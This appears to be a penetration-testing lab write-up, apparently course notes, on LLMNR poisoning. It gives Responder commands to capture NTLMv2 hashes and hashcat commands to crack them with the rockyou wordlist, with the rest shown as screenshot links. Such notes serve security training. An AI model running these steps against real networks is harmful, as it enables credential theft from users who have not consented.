## LLMNR Poisoning - Capturing NTLMv2 Hashes
```bash
ifconfig 
sudo responder -I eth0
```

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-1.png"> 




</br>

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-2.png"> 






## Trigger an LLMNR Event

<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-3.png"> 




## Dumping NTLMv2 Hashes
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-4.png"> 



## Save Hash to a file
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-5.png"> 



## Use Hashcat to crack the hash 
```bash
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-6.png"> 


<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-7.png"> 

## Use John to crack the hash 
<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/llmnr-capture-ntlmv2hash-8.png"> 
